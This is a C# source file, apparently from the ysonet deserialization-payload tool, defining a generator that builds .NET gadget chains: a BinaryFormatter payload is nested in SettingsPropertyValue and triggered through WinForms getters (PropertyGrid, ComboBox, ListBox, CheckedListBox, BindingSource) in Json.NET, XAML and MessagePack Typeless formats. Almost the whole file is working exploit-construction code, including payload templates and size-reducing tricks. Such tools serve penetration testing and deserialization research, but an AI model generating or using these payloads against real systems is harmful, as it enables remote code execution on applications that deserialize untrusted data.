using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Windows.Markup;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class GetterSettingsPropertyValueGenerator : GenericGenerator
    {
        // Discovery facets (category search only): a WinForms getter chain reaches a
        // BinaryFormatter sink (SettingsPropertyValue). Framework built-in types. WPF
        // is only needed on the Xaml formatter path, not the primary chain, so it is
        // not claimed here. All variants share this capability.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.NestedDeserialization)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // getter-call chain; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        // SettingsPropertyValue + Getter call gadget
        // SettingsPropertyValue.get_PropertyValue leads to the BinaryFormatter.Deserialize

        // We can deserialize the SettingsPropertyValue with proper member values (like Deserialzed=False and SerializedValue=BinaryFormatter_gadget)
        // and then call the get_PropertyValue with one of the getter-call gadgets:
        // PropertyGrid
        // ComboBox
        // ListBox
        // CheckedListBox
        // BindingSource

        // BindingSource (variant 5) is not a Control. Its DataMember setter names the
        // property and its DataSource setter supplies the object, and whichever lands second
        // calls ResetList -> ListBindingHelper.GetList(dataSource, dataMember) ->
        // PropertyDescriptor.GetValue. That matters here because the other four carriers are
        // WinForms controls, so this is the only variant that reaches the getter without
        // building a control in the target process.
        //
        // It is XAML ONLY, and the reason is the carrier rather than the sink: BindingSource
        // implements IList, so Json.NET refuses the document outright ("the type requires a
        // JSON array") and both MessagePack Typeless flavours read it as a collection. Xaml
        // sets members by name regardless of the interfaces the type carries, so it is the
        // one advertised formatter left. Measured, not assumed - see the Without() call on
        // the variant below.

        // It should be possible to use it with the serializers that are able to call the one-arg constructor
        // MessagePack gadget works from version 2.3.75. There is a huge chance that it will also work for older versions after some tweaking.

        private int variant_number = 1; // Default

        public override List<string> SupportedFormatters()
        {
            // The "(N)" suffix is a display-only annotation meaning "this formatter
            // carries N variants". Json.NET builds the four Control getter chains, Xaml
            // builds those four plus the BindingSource one, and the MessagePack helpers
            // implement variant 1 only, so variants 2-5 opt out of them below and the
            // formatter names stay bare.
            return new List<string> { "Json.NET (4)", "Xaml (5)", "MessagePackTypeless", "MessagePackTypelessLz4" };
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "PropertyGrid getter (default; only option for MessagePack)"),
                new GadgetVariant(2, "ComboBox getter")
                    .Without(Formatters.MessagePackTypeless, Formatters.MessagePackTypelessLz4),
                new GadgetVariant(3, "ListBox getter")
                    .Without(Formatters.MessagePackTypeless, Formatters.MessagePackTypelessLz4),
                new GadgetVariant(4, "CheckedListBox getter")
                    .Without(Formatters.MessagePackTypeless, Formatters.MessagePackTypelessLz4),

                // Xaml only. Json.NET and both MessagePack flavours read BindingSource as a
                // list, because it implements IList, and populate it with Add instead of
                // calling the two setters. Without() is what keeps them out of the variant
                // sweeps and out of the interactive editor for this variant.
                new GadgetVariant(5, "BindingSource getter (Xaml only; no Control is built)")
                    .Without(Formatters.JsonNet, Formatters.MessagePackTypeless, Formatters.MessagePackTypelessLz4)
            };
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Variant number. The (N) formatter suffix counts these variants; bare MessagePack formatters support only variant 1. Variant defines a different getter-call gadget. Choices: \r\n1 (default) - PropertyGrid getter-call gadget, " +
                "\r\n2 - ComboBox getter-call gadget (may execute code twice)" +
                "\r\n3 - ListBox getter-call gadget" +
                "\r\n4 - CheckedListBox getter-call gadget" +
                "\r\n5 - BindingSource getter-call gadget (Xaml only; a Component, so no WinForms control is built on the target)",
                v => int.TryParse(v, out variant_number) },
            }
            .WithMetadata("variant", OptionMetadata.ForVariants(Variants()));

            return options;
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Bridged, GadgetTags.GetterChain };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override bool NeedsUnminifiedBridgedPayload(
            string formatter, InputArgs inputArgs)
        {
            return inputArgs != null && inputArgs.Minify
                && IsMessagePackLz4(formatter);
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Reject every formatter a variant opted out of, using the catalogue's
            // shared guard so the message, the interactive editor block and the matrix all
            // agree. It runs BEFORE the MessagePack branch on purpose so a request for
            // variants 2-5 cannot be silently switched to variant 1.
            GuardVariantFormatter(variant_number, formatter);

            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                binaryFormatterPayload = (byte[])new TypeConfuseDelegateGenerator()
                    .GenerateInner("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            string payload = "";

            if (formatter.ToLower().Equals("json.net"))
            {
                string spvPayload = @"{
            '$type':'System.Configuration.SettingsPropertyValue, System',
            'Name':'test',
            'IsDirty':false,
            'SerializedValue':
                {
                    '$type':'System.Byte[], mscorlib',
                    '$value':'" + b64encoded + @"'
                },
            'Deserialized':false
        }";
                if (variant_number == 2)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.ComboBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + spvPayload + @"
    ], 
    'DisplayMember':'PropertyValue',
    'Text':'watever'
}";
                }
                else if (variant_number == 3)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.ListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + spvPayload + @"
    ], 
    'DisplayMember':'PropertyValue',
    'Text':'watever'
}";
                }
                else if (variant_number == 4)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.CheckedListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + spvPayload + @"
    ], 
    'DisplayMember':'PropertyValue',
    'Text':'watever'
}";
                }
                else
                {
                    payload = @"{
    '$type':'System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'SelectedObjects':[
        " + spvPayload + @"
    ]
}";
                }

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonMinifier.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = JsonMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("xaml"))
            {

                String bfBytes = XamlWriter.Save(binaryFormatterPayload);
                // Declare the System namespace as the DEFAULT on the array element so each byte
                // element can stay the bare <Byte>...</Byte> that XamlWriter emits, instead of
                // repeating an "s:" prefix on every one. That prefix costs 4 bytes per array
                // element (open + close tag); on a payload with thousands of bytes this saves
                // several KB for the price of one extra xmlns on the array. The children resolve
                // to System.Byte via the default namespace; "assembly:" and "s:" (for Type) are
                // still in scope from the SettingsPropertyValue ancestor.
                bfBytes = bfBytes.Replace("<Byte[] xmlns=\"clr-namespace:System;assembly=mscorlib\">", "<assembly:Array Type=\"s:Byte\" xmlns=\"clr-namespace:System;assembly=mscorlib\">");
                bfBytes = bfBytes.Replace("</Byte[]>", "</assembly:Array>");

                if (variant_number == 2)
                {
                    payload = "<ComboBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ComboBox.Items><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></ComboBox.Items><ComboBox.DisplayMember>PropertyValue</ComboBox.DisplayMember><ComboBox.Text>watever</ComboBox.Text></ComboBox>";
                }
                else if (variant_number == 3)
                {
                    payload = "<ListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ListBox.Items><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></ListBox.Items><ListBox.DisplayMember>PropertyValue</ListBox.DisplayMember><ListBox.Text>watever</ListBox.Text></ListBox>";
                }
                else if (variant_number == 4)
                {
                    payload = "<CheckedListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><CheckedListBox.Items><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></CheckedListBox.Items><CheckedListBox.DisplayMember>PropertyValue</CheckedListBox.DisplayMember><CheckedListBox.Text>watever</CheckedListBox.Text></CheckedListBox>";
                }
                else if (variant_number == 5)
                {
                    // DataMember is an ATTRIBUTE and DataSource a property element, so
                    // XamlReader assigns DataMember first: the DataSource setter is then the
                    // one that calls ResetList with both values and reaches the getter.
                    // Either order works - both setters call ResetList - but this is the
                    // order Munoz and Mirosh published, so it is the one written here.
                    payload = "<BindingSource DataMember=\"PropertyValue\" xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><BindingSource.DataSource><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></BindingSource.DataSource></BindingSource>";
                }
                else
                {
                    payload = "<PropertyGrid UseCompatibleTextRendering=\"True\" Location=\"0, 0\" Name=\"\" TabIndex=\"0\" xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><PropertyGrid.SelectedObject><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></PropertyGrid.SelectedObject></PropertyGrid>";
                }

                if (inputArgs.Minify)
                {
                    // Compact minified form. SettingsPropertyValue.Deserialize() accepts the
                    // SerializedValue as a base64 STRING when the owning SettingsProperty has
                    // SerializeAs=Binary: it then runs Convert.FromBase64String followed by
                    // BinaryFormatter.Deserialize internally, reaching the exact same state as
                    // passing a byte[]. That lets us drop the ~1600-element <Byte> array (tens of
                    // KB) and emit one short base64 string instead, cutting the Xaml payload by
                    // ~90% (about 35 KB down to ~3 KB). b64encoded already holds the loose,
                    // minify-shortened BinaryFormatter payload. The template is written with no
                    // wasteful whitespace, so it needs no XmlMinifier pass (and nothing touches
                    // the base64 text). Verified to deserialize and fire under XamlReader.Load for
                    // all four getter variants.
                    string spv =
                        "<sc:SettingsPropertyValue IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\">"
                        + "<x:Arguments><sc:SettingsProperty SerializeAs=\"Binary\"><x:Arguments><s:String>test</s:String></x:Arguments></sc:SettingsProperty></x:Arguments>"
                        + "<sc:SettingsPropertyValue.SerializedValue><s:String>" + b64encoded + "</s:String></sc:SettingsPropertyValue.SerializedValue>"
                        + "</sc:SettingsPropertyValue>";

                    if (variant_number == 2)
                    {
                        payload = "<ComboBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ComboBox.Items>" + spv + "</ComboBox.Items><ComboBox.DisplayMember>PropertyValue</ComboBox.DisplayMember><ComboBox.Text>watever</ComboBox.Text></ComboBox>";
                    }
                    else if (variant_number == 3)
                    {
                        payload = "<ListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><ListBox.Items>" + spv + "</ListBox.Items><ListBox.DisplayMember>PropertyValue</ListBox.DisplayMember><ListBox.Text>watever</ListBox.Text></ListBox>";
                    }
                    else if (variant_number == 4)
                    {
                        payload = "<CheckedListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><CheckedListBox.Items>" + spv + "</CheckedListBox.Items><CheckedListBox.DisplayMember>PropertyValue</CheckedListBox.DisplayMember><CheckedListBox.Text>watever</CheckedListBox.Text></CheckedListBox>";
                    }
                    else if (variant_number == 5)
                    {
                        payload = "<BindingSource DataMember=\"PropertyValue\" xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><BindingSource.DataSource>" + spv + "</BindingSource.DataSource></BindingSource>";
                    }
                    else
                    {
                        payload = "<PropertyGrid UseCompatibleTextRendering=\"True\" Location=\"0, 0\" Name=\"\" TabIndex=\"0\" xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><PropertyGrid.SelectedObject>" + spv + "</PropertyGrid.SelectedObject></PropertyGrid>";
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.Xaml_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }

                return payload;
            }
            else if (IsMessagePackTypeless(formatter))
            {
                Console.WriteLine("\r\nThis version of the gadget works for MessagePack >= 2.3.75\r\n");
                bool useLz4 = IsMessagePackLz4(formatter);
                byte[] serializedData = BuildMessagePackTypeless(
                    binaryFormatterPayload, useLz4);

                // Minifying the nested BinaryFormatter stream usually helps, but a smaller
                // input can compress a little worse. Compare complete Lz4 containers and
                // keep the shorter one so --minify never expands this formatter cell. A
                // normal direct generation can build its own raw inner candidate; a --bgc
                // chain receives the corresponding candidate from PayloadRunner.
                if (inputArgs != null && inputArgs.Minify && useLz4)
                {
                    byte[] unminifiedBinaryFormatterPayload;
                    if (BridgedPayload != null)
                    {
                        if (UnminifiedBridgedPayload == null)
                            throw new InvalidOperationException(Name() + " needs the unminified "
                                + "bridge candidate to guarantee that --minify does not enlarge "
                                + Formatters.MessagePackTypelessLz4 + ". Generate the chain "
                                + "through PayloadRunner.");
                        unminifiedBinaryFormatterPayload =
                            (byte[])UnminifiedBridgedPayload;
                    }
                    else
                    {
                        InputArgs unminifiedArgs = inputArgs.DeepCopy();
                        unminifiedArgs.Minify = false;
                        unminifiedArgs.Test = false;
                        unminifiedBinaryFormatterPayload =
                            (byte[])new TypeConfuseDelegateGenerator()
                                .GenerateInner(Formatters.BinaryFormatter, unminifiedArgs);
                    }

                    byte[] unminifiedContainer = BuildMessagePackTypeless(
                        unminifiedBinaryFormatterPayload, true);
                    if (unminifiedContainer.Length < serializedData.Length)
                        serializedData = unminifiedContainer;
                }

                return FinishHandWrittenPayload(serializedData, formatter, inputArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

        // The MessagePack Typeless encoding of variant 1 (the PropertyGrid getter chain).
        // Building the real graph would run the getter inside ysonet, so serialize the
        // surrogate graph below and have MessagePack write the two framework type names
        // instead of the surrogate ones. MessagePack >= 2.3.75.
        private static byte[] BuildMessagePackTypeless(byte[] binaryFormatterPayload, bool useLz4)
        {
            var graph = new PropertyGridSurrogate
            {
                SelectedObjects = new object[]
                {
                    new SettingsPropertyValueSurrogate
                    {
                        Deserialized = false,
                        SerializedValue = binaryFormatterPayload
                    }
                }
            };

            var targetTypeNames = new Dictionary<Type, string>
            {
                {
                    typeof(SettingsPropertyValueSurrogate),
                    "System.Configuration.SettingsPropertyValue, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"
                },
                {
                    typeof(PropertyGridSurrogate),
                    "System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"
                }
            };

            return MessagePackTypelessTypeSwap.SerializeAs(graph, targetTypeNames, useLz4);
        }

        // Shape only, never deserialized as itself: MessagePackTypelessTypeSwap rewrites each
        // type name to the framework type in the map above before the payload leaves ysonet.
        // Every public property is written, so the member list must match the real target's
        // (including the unset `property`, which the getter chain expects to see).
        internal sealed class SettingsPropertyValueSurrogate
        {
            public bool Deserialized { get; set; }
            public object SerializedValue { get; set; }
            public object property { get; set; }
        }

        internal sealed class PropertyGridSurrogate
        {
            public object[] SelectedObjects { get; set; }
        }
    }

}
